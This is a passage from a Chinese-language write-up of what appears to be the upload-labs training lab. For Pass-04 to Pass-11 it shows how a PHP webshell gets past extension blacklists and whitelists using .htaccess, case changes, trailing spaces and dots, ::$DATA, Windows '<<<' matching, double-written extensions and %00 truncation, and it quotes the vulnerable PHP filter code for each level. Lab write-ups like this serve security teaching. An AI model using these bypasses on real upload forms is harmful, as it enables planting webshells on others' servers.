alt></p><p>发现本次可以显示内容，</p><p><img src="/images/121p4_15.png" alt></p><p>在服务器查看 <code>3.php</code> 文件。</p><p><img src="/images/121p4_14.png" alt></p><h4 id="Pass-04-代码分析"><a href="#Pass-04-代码分析" class="headerlink" title="Pass-04 代码分析"></a>Pass-04 代码分析</h4><p>核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>黑名单中名单虽多，但是并没有 <code>.htaccess</code> 所以可以先上传 <code>.htaccess</code>，之后把 <code>404.php</code> 另存为 <code>404.jpg</code>，上传 <code>404.jpg</code>，会以 <code>php</code>文件解析。 当输入为 <code>2.php:.jpg</code>时，经过处理后输出为 <code>.jpg</code>，可以绕过检测，上传至服务器上，由于 <code>windows</code> 特性，上传的文件名为 <code>2.php</code>。之后再修改文件名为 <code>2.&lt;&lt;&lt;</code>，系统检测到后匹配</p><p><img src="/images/121p4_22.png" alt></p><p>到 <code>2.php</code> 文件，之后把内容覆盖掉。</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><h4 id="先判断上传漏洞的类型-2"><a href="#先判断上传漏洞的类型-2" class="headerlink" title="先判断上传漏洞的类型"></a>先判断上传漏洞的类型</h4><p>选择 <code>2.php</code> 文件，无法上传。</p><p><img src="/images/121p5_3.png" alt></p><p>选择 <code>webshell.txt</code> ，上传成功，</p><p><img src="/images/121p5_1.png" alt></p><p>查看文件，</p><p><img src="/images/121p5_2.png" alt></p><p>该类型为黑名单的文件重命名上传。</p><p><img src="/images/121p5_4.png" alt></p><h4 id="根据已知信息构造后缀绕过检查-2"><a href="#根据已知信息构造后缀绕过检查-2" class="headerlink" title="根据已知信息构造后缀绕过检查"></a>根据已知信息构造后缀绕过检查</h4><p>打开 <code>burpsuite</code> 软件，选择一个文件点击上传，用 <code>burpsuite</code> 抓取数据包，右击发送到 <code>Repeater</code> 模块。</p><p><img src="/images/121p5_5.png" alt></p><p>修改 <code>2.php</code> 为 <code>2.pHP</code> 发现可以上传成功，</p><p><img src="/images/121p5_6.png" alt></p><p>返回 <code>Proxy</code> 模块，修改后缀 <code>.php</code> 为 <code>.pHP</code>，</p><p><img src="/images/121p5_7.png" alt></p><p>查看文件</p><p><img src="/images/121p5_8.png" alt></p><h4 id="Pass-05-代码分析"><a href="#Pass-05-代码分析" class="headerlink" title="Pass-05 代码分析"></a>Pass-05 代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与 <code>Pass-04</code> 代码相比，可以发现，黑名单中增加了 <code>.htaccess</code> 后缀名。但是，缺少了 <code>strtolower()</code> 函数，所以可以通过大写绕过。</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><h4 id="先判断上传漏洞的类型-3"><a href="#先判断上传漏洞的类型-3" class="headerlink" title="先判断上传漏洞的类型"></a>先判断上传漏洞的类型</h4><p>上传 <code>1.php</code> ，提示此文件类型不能上传。</p><p><img src="/images/121p6_1.png" alt></p><p>上传 <code>webshell.txt</code> ，发现可以上传，</p><p><img src="/images/121p6_2.png" alt></p><p>查看文件，</p><p><img src="/images/121p6_3.png" alt></p><p>可以发现，文件名已经改变，故该类型为黑名单重命名上传类型。</p><p><img src="/images/121p6_4.png" alt></p><h4 id="根据已知信息构造后缀绕过检测"><a href="#根据已知信息构造后缀绕过检测" class="headerlink" title="根据已知信息构造后缀绕过检测"></a>根据已知信息构造后缀绕过检测</h4><p>用 <code>burpsuite</code> 抓取数据包，在 <code>Repeater</code> 判断绕过的方法。</p><p><img src="/images/121p6_5.png" alt></p><p>多次尝试后，发现在后缀名后添加空格就可以绕过检测。</p><p><img src="/images/121p6_6.png" alt></p><p>返回 <code>Proxy</code> 模块，修改后缀名，可以上传成功，查看文件</p><p><img src="/images/121p6_7.png" alt></p><h4 id="Pass-06-代码分析"><a href="#Pass-06-代码分析" class="headerlink" title="Pass-06 代码分析"></a>Pass-06 代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">$file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA    </span></span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后缺少 <code>trim()</code> ，所以可以通过后缀名加空格来绕过。 </p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><h4 id="先判断上传漏洞的类型-4"><a href="#先判断上传漏洞的类型-4" class="headerlink" title="先判断上传漏洞的类型"></a>先判断上传漏洞的类型</h4><p>上传 <code>1.php</code> 提示：此文件类型不允许上传！</p><p><img src="/images/121p7_1.png" alt></p><p>上传 <code>webshell.txt</code> ，可以上传，查看文件，</p><p><img src="/images/121p7_2.png" alt></p><p>可以判断该类型为黑名单不重命名的上传类型。</p><h4 id="根据已知信息构造后缀绕过检测-1"><a href="#根据已知信息构造后缀绕过检测-1" class="headerlink" title="根据已知信息构造后缀绕过检测"></a>根据已知信息构造后缀绕过检测</h4><p>用 <code>burpsuite</code> 抓取数据包，在 <code>Repeater</code> 判断绕过的方法。多次尝试后，发现把 <code>2.php</code> 改成 <code>2.php.</code> 可以绕过检测。</p><p><img src="/images/121p7_3.png" alt></p><p>返回 <code>Proxy</code> 模块，进行上传，</p><p><img src="/images/121p7_4.png" alt></p><p>发现可以上传成功，点击查看文件，</p><p><img src="/images/121p7_5.png" alt></p><h4 id="Pass-07-代码分析"><a href="#Pass-07-代码分析" class="headerlink" title="Pass-07 代码分析"></a>Pass-07 代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...    </span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空    </span></span><br><span class="line">...    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>程序通过对末尾 <code>.</code> 的处理，来取出后缀，但输入为 <code>2.php.</code> 的话，最后输出为 <code>.</code> 可以绕过检测。上传至服务器的后缀名为 <code>.php.</code> 由于服务器系统特性，也可以解析为 <code>.php</code>。</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><h4 id="先判断上传漏洞的类型-5"><a href="#先判断上传漏洞的类型-5" class="headerlink" title="先判断上传漏洞的类型"></a>先判断上传漏洞的类型</h4><p>上传 <code>1.php</code> ，无法上传，提示：此文件类型不允许上传。</p><p><img src="/images/121p8_1.png" alt></p><p>上传 <code>webshell.txt</code> ，上传成功，查看文件，</p><p><img src="/images/121p8_2.png" alt></p><p>可以看出，该类型为黑名单重命名的上传类型。</p><h4 id="根据已知信息构造后缀绕过检测-2"><a href="#根据已知信息构造后缀绕过检测-2" class="headerlink" title="根据已知信息构造后缀绕过检测"></a>根据已知信息构造后缀绕过检测</h4><p>用 <code>burpsuite</code> 抓取数据包，在 <code>Repeater</code> 判断绕过的方法。多次尝试，发现把 <code>2.php</code> 修改为 <code>2.php::$DATA</code> 可以绕过检测。</p><p><img src="/images/121p8_3.png" alt></p><p>返回 <code>Proxy</code> 模块进行上传。</p><p><img src="/images/121p8_4.png" alt></p><p>上传成功后，点击查看文件，</p><p><img src="/images/121p8_5.png" alt></p><p>把后面的 <code>::$data</code> 重新上传</p><p><img src="/images/121p8_6.png" alt></p><h4 id="Pass-08-代码分析"><a href="#Pass-08-代码分析" class="headerlink" title="Pass-08 代码分析"></a>Pass-08 代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与前几篇的对比可以发现，通过 <code>::$DATA</code> 绕过。</p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><h4 id="先判断上传漏洞的类型-6"><a href="#先判断上传漏洞的类型-6" class="headerlink" title="先判断上传漏洞的类型"></a>先判断上传漏洞的类型</h4><p>上传 <code>1.php</code> ，无法上传，提示：此文件类型不允许上传。</p><p><img src="/images/121p9_1.png" alt></p><p>上传 <code>webshell.txt</code> ，可以上传成功，查看文件，</p><p><img src="/images/121p9_2.png" alt></p><p>可以看出，该类型为黑名单不重命名的上传类型。</p><h4 id="根据已知信息构造后缀绕过检测-3"><a href="#根据已知信息构造后缀绕过检测-3" class="headerlink" title="根据已知信息构造后缀绕过检测"></a>根据已知信息构造后缀绕过检测</h4><h5 id="使用点空格点绕过"><a href="#使用点空格点绕过" class="headerlink" title="使用点空格点绕过"></a>使用点空格点绕过</h5><p>上传 <code>2.php</code> 文件，同时使用 <code>burpsuite</code> 改包，把 <code>2.php</code> 修改为 <code>2.php. .</code>，点击 <code>Forward</code> ，上传成功。</p><p><img src="/images/121p9_12.png" alt></p><p>查看文件</p><p><img src="/images/121p9_13.png" alt></p><h5 id="利用系统特性覆盖空的php文件-1"><a href="#利用系统特性覆盖空的php文件-1" class="headerlink" title="利用系统特性覆盖空的php文件"></a>利用系统特性覆盖空的php文件</h5><p>用 <code>burpsuite</code> 抓取数据包，在 <code>Repeater</code> 判断绕过的方法。多次尝试，将 <code>2.php</code> 改成 <code>2.php:jpg</code>，可以长传成功。</p><p><img src="/images/121p9_3.png" alt></p><p>返回 <code>Proxy</code> 模块，上传文件成功，查看文件，</p><p><img src="/images/121p9_6.png" alt></p><p>把 <code>:jpg</code> 删掉，</p><p><img src="/images/121p9_6.png" alt></p><p>刷新网页，</p><p><img src="/images/121p9_7.png" alt></p><p>打开服务器，查看 <code>2.php</code>，发现确实没有数据，</p><p><img src="/images/121p9_4.png" alt></p><p>重新上传，把 <code>2.php</code> 修改为 <code>2.&lt;&lt;&lt;</code> ，</p><p><img src="/images/121p9_8.png" alt></p><p>查看文件，</p><p><img src="/images/121p9_9.png" alt></p><p>把  <code>&lt;&lt;&lt;</code> 改为 <code>.php</code> </p><p><img src="/images/121p9_10.png" alt></p><p>查看服务器端的 <code>2.php</code> 文件</p><p><img src="/images/121p9_11.png" alt></p><h5 id="Pass-09-代码分析"><a href="#Pass-09-代码分析" class="headerlink" title="Pass-09 代码分析"></a>Pass-09 代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">...    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件名的处理过程如图所示，</p><p><img src="/images/%E6%96%87%E4%BB%B6%E5%90%8D%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B.png" alt></p><p>当输入文件名为  <code>1.pHP.</code> 时，<code>1.pHP.</code> → <code>1.pHP</code> → <code>.pHP</code> → <code>.php</code> → <code>.php</code> → 输出。</p><p>当输入文件名为 <code>1.php.空格</code>时，<code>1.php.空格</code> → <code>1.php.</code> → <code>1.php</code> → <code>.php</code> → 输出。</p><p>当输入文件名为 <code>1.php.空格.</code> 时，<code>1.php.空格.</code> → <code>1.php.空格.</code> → <code>1.php.空格</code> → <code>.空格</code> → <code>.</code> →输出。</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><h4 id="先判断上传漏洞类型"><a href="#先判断上传漏洞类型" class="headerlink" title="先判断上传漏洞类型"></a>先判断上传漏洞类型</h4><p>上传 <code>1.php</code> 文件，发现可以上传成功，</p><p><img src="/images/121p10_1.png" alt></p><p>点击查看文件，</p><p><img src="/images/121p10_2.png" alt></p><p>发现文件名字变为 <code>1.</code> ，推测有可能检测到后缀名中有 <code>php</code> 后就把后缀的 <code>php</code> 给去掉了，尝试双拼绕过。</p><p><img src="/images/121p10_3.png" alt></p><p>点击上传，可以上传成功，查看文件，</p><p><img src="/images/121p10_4.png" alt></p><h4 id="Pass-10-代码分析"><a href="#Pass-10-代码分析" class="headerlink" title="Pass-10 代码分析"></a>Pass-10 代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">$temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把在黑名单中出现的后缀名替换为空，即可以通过双拼绕过。</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><h4 id="先判断上传漏洞类型-1"><a href="#先判断上传漏洞类型-1" class="headerlink" title="先判断上传漏洞类型"></a>先判断上传漏洞类型</h4><p>上传 <code>1.php</code> 文件，没有成功，提示：只允许上传 <code>.jpg|.png|.gif</code> 类型文件。首先确定为白名单策略。</p><p><img src="/images/121p11_1.png" alt></p><p>选择图片上传，</p><p><img src="/images/121p11_2.png" alt></p><p>查看图片，</p><p><img src="/images/121p11_3.png" alt></p><p>可以判断出该类型是白名单重命名上传类型。</p><h4 id="根据已知信息构造后缀绕过检测-4"><a href="#根据已知信息构造后缀绕过检测-4" class="headerlink" title="根据已知信息构造后缀绕过检测"></a>根据已知信息构造后缀绕过检测</h4><p>用 <code>burpsuite</code> 抓取数据包，在 <code>Repeater</code> 判断绕过的方法。多次尝试，把 <code>2.php</code> 改成 <code>2.php%00.jpg</code> 。</p><p>打开服务端，里面没有 <code>2.php</code> 文件。</p><p><img src="/images/121p11_9.png" alt></p><p>在 <code>burpsuite</code> 改包，</p><p><img src="/images/121p11_8.png" alt></p><p>上传成功后，查看</p><p><img src="/images/121p11_10.png" alt></p><p>查看服务端，</p><p><img src="/images/121p11_11.png" alt></p><p>文件名只保留 <code>2.php</code>，刷新页面</p><p><img src="/images/121p11_12.png" alt></p><h4 id="Pass-11-代码分析"><a href="#Pass-11-代码分析" class="headerlink" title="Pass-11 代码分析"></a>Pass-11 代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span 